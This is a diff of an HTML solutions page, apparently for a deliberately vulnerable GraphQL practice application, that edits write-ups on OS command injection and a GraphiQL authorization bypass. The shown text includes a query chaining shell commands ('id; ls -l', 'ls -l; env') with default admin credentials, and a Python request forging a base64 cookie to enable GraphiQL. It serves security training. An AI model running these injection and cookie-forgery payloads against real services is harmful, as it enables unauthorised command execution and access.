@@ -403,7 +403,6 @@ mutation {
     result
   }
 }
-
 </pre>
               </div>
               <!-- End -->
@@ -412,7 +411,7 @@ mutation {
               <h3 style="color:purple" id="exec-os-2"><b>Code Execution :: OS Command Injection #2</b></h3>
               <hr />
               <h5>Problem Statement</h5>
-              <p>The query <code>systemDiagnostics</code> accepts certain UNIX binaries as parameters for debugging purposes, such as <code>whoami</code>, <code>ls</code>, <code>ps</code>, etc. However, it is protected with a username and password. After obtaining the <a href="http://127.0.0.1:5000/solutions#misc-weakpass">correct credentials</a>, the filtering can easily be bypassed by chaining commands together.</p>
+              <p>The query <code>systemDiagnostics</code> accepts certain UNIX binaries as parameters for debugging purposes, such as <code>whoami</code>, <code>ps</code>, etc. It acts as a restricted shell. However, it is protected with a username and password. After obtaining the <a href="http://127.0.0.1:5000/solutions#misc-weakpass">correct credentials</a>, the restricted shell seems to be bypassable by chaining commands together.</p>
               <h5>Resources</h5>
               <ul>
                 <li><a href="https://www.netsparker.com/blog/web-security/command-injection-vulnerability/" target="_blank"><i class="fa fa-newspaper"></i> Netsparker - Command Injection</a></li>
@@ -420,6 +419,7 @@ mutation {
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-exec-os-2')">Show</button></h5>
               <div id="sol-exec-os-2" style="display:none">
               <pre class="bash">
+
 # System Diagnostics suffers from weak restricted shell implementation
 
 query {
@@ -436,7 +436,7 @@ query {
 
 
 query {
-  systemDiagnostics(username:"admin", password:"password", cmd:"ls -l; env")
+  systemDiagnostics(username:"admin", password:"password", cmd:"id; ls -l")
 
 >>> Response:
 {
@@ -508,7 +508,7 @@ mutation {
             <h3 style="color:purple" id="authzbypass-igql"><b>Authorization Bypass :: GraphQL Interface Protection Bypass</b></h3>
               <hr />
               <h5>Problem Statement</h5>
-              <p>GraphiQL is available at the path <code>/graphiql</code>. Due to a a poorly implemented authorization check, a user is able to manipulate their own cookies to grant themselves access to the interface and bypass the check.</p>
+              <p>GraphiQL is available at the path <code>/graphiql</code> with a poorly implemented authorization check.</p>
              <h5>Resources</h5>
               <ul>
                 <li><a href="https://cwe.mitre.org/data/definitions/639.html" target="_blank"><i class="fa fa-newspaper"></i> CWE-639 - Authorization Bypass Through User-Controlled Key</a></li>
@@ -525,6 +525,9 @@ Z3JhcGhpcWw6ZGlzYWJsZQ==  - graphiql:disable
 requests.post('http://host/graphiql',
               json={"query":"query IntrospectionQuery{__schema {queryType { name } mutationType { name } subscriptionType { name }}}"},
               cookies={'env':'Z3JhcGhpcWw6ZW5hYmxl'})
+
+# Expert mode
+# graphiql interface is disabled.
 </pre>
               </div>
               <!-- End -->
